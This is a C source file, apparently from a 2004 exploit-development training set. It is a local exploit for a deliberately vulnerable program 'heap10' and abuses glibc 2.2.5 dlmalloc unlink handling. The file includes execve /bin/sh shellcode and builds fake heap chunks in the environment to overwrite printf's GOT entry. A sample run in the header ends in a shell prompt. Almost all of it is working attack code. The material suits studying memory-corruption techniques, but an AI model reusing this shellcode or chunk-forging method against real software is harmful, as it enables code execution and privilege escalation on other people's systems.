/*
 * $Id: heap10-ex.c,v 1.1 2004/11/05 11:03:30 raptor Exp $
 *
 * heap10-ex.c - heap10.c exploit (malloc() exploitation)
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit uses the advanced malloc() exploitation technique (dlmalloc
 * from glibc 2.2.5) described in the shellcoder's handbook, chapter 5. The
 * shellcode is also stuck into the environment, before the fake free chunk.
 *
 * "Abusing malloc may be quite difficult -- you eventually enter a loop."
 *
 * This local exploit overwrites the free()'d chunk's pointers into a fake 
 * chunk on the stack in the environment, which the user can control and 
 * locate exactly: the environment is perfect since it can contain nulls. It
 * is important to align our buffers so they are not at addresses with the
 * lower bits set (we don't want malloc() to think our buffers are mmap()'ed
 * or have the previous bit set).
 *
 * You'll most likely need to do some tuning to make it work on your system.
 *
 * raptor@karma:~/devel$ uname -a
 * Linux karma 2.4.18-1-686-smp #1 SMP Wed Apr 14 18:42:49 UTC 2004 i686 unknown
 * raptor@karma:~/devel$ gcc --version
 * 2.95.4
 * raptor@karma:~/devel$ ./heap10-ex 
 * Using chunk address     : 0xbffffbd4
 * Using chunk align       : 2
 * Using chunk offset      : 32
 * Using printf() address  : 0x8049694
 * Using ret address       : 0xbffff7c9
 *
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VULN		"./heap10"	// the vulnerable program
#define	BUFSIZE		2048 + 1	// max size of the evil buf
#define	ENVSIZE		512		// max number of env vars
#define	FAKE_SIZE	0xfffffffc	// -4 (PREV_INUSE = 0)
#define	CHUNK_ALIGN	2		// may need to change this
#define	CHUNK_OFFSET	32		// may need to change this
#define PRINTF		0x08049694	// printf() address in .got

char sc[] = /* linux/x86 shellcode (12 + 24 = 36 bytes) */
"\xeb\x0eNEEDLONGERJUMP"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

/* prototypes */
int	add_env(char **envp, char *string, int tot_size);

/*
 * main()
 */
int main(int argc, char **argv)
{
	/* chunk must be big enough to survive orl $0x1,0x4(%eax,%esi,1) */
	char	chunk[BUFSIZE];
	char	buf[BUFSIZE], *env[ENVSIZE], *p;
	int	i, chunk_addr;
	int	chunk_align = CHUNK_ALIGN;
	int	chunk_offset = CHUNK_OFFSET;

	/* calculate the ret address in envp */
	int	ret = 0xbffffffa - strlen(sc) - strlen(VULN) - sizeof(chunk);

	/* read optional alignment and offset from command line */
	if (argc > 1)
		chunk_align = atoi(argv[1]);
	if (argc > 2)
		chunk_offset = atoi(argv[2]);

  	/* prepare the fake free chunk boundary */
  	memset(chunk, 0x0, sizeof(chunk));
	memset(chunk, 'A', chunk_align);

	p = chunk + chunk_align;
	for (i = chunk_align; i < sizeof(chunk) - 16 - 1; i += 16) {

		/* prev_size field */
		*((void **)p) = (void *)(FAKE_SIZE);
		p += 4;

		/* size field to break loop */
		*((void **)p) = (void *)(1024 + 8);
		p += 4;

		/* fd field (retval) */
		*((void **)p) = (void *)(ret);
		p += 4;

		/* bk field (retloc) */
		*((void **)p) = (void *)(PRINTF - 8);
		p += 4;
	}

	/* calculate the chunk address in env */
	chunk_addr = (0xc0000000 - 4) - strlen(VULN) - chunk_offset - 1024;

	/* prepare the evil buffer */
	memset(buf, 'A', sizeof(buf));
	p = buf + 1024;

	/* prev_size field */
	*((void **)p) = (void *)(FAKE_SIZE);
	p += 4;

	/* size field */
	*((void **)p) = (void *)(FAKE_SIZE);
	p += 4;

	/* fd field pointing to our fake free chunk */
	*((void **)p) = (void *)(chunk_addr);
	p += 4;

	/* bk field pointing to our fake free chunk */
	*((void **)p) = (void *)(chunk_addr);
	p += 4;

	/* prepare the environment array */
	for (i = 0; i < ENVSIZE; i++)
		env[i] = 0x0;

	/* copy our shellcode in envp */
	env[0] = strdup(sc);

	/* copy our fake chunk in envp */
	i = add_env(env, chunk, sizeof(chunk));

	/* print some output */
	fprintf(stderr, "Using chunk address\t: %p\n", chunk_addr);
	fprintf(stderr, "Using chunk align\t: %d\n", chunk_align);
	fprintf(stderr, "Using chunk offset\t: %d\n", chunk_offset);
	fprintf(stderr, "Using printf() address\t: %p\n", PRINTF);
	fprintf(stderr, "Using ret address\t: %p\n\n", ret);

  	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, env);
	perror("execle");
}

/*
 * add_env(): handy environment loader
 */
int add_env(char **envp, char *string, int tot_size)
{
	char	*p = string;
	int	i, size = 0;

	for (i = 1; size < tot_size; i++) {
		envp[i] = strdup(p);
		size += strlen(p) + 1;
		p += strlen(p) + 1;
	}

	return i;
}
